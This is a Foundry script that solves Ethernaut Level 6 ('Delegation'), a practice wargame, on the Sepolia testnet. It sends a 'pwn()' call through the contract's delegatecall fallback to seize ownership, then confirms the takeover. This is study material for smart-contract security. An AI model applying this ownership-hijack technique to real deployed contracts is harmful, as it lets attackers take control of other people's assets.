// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Delegation.sol";

/*
    Solution script for the Ethernaut Level 6: Delegation

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in DelegationScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Delegation.s.sol:DelegationScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Delegation.s.sol/11155111
*/

contract DelegationScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x990355751a6C00E8Ab4a2785c9c0c9BB15f94a54;
    Delegation public level6 = Delegation(instance);

    function run() external {
        vm.startBroadcast();

        (bool success,) = address(level6).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");

        // if the player is not the owner then we have failed so revert
        require(level6.owner() == msg.sender, "Owner not updated correctly");

        vm.stopBroadcast();
    }
}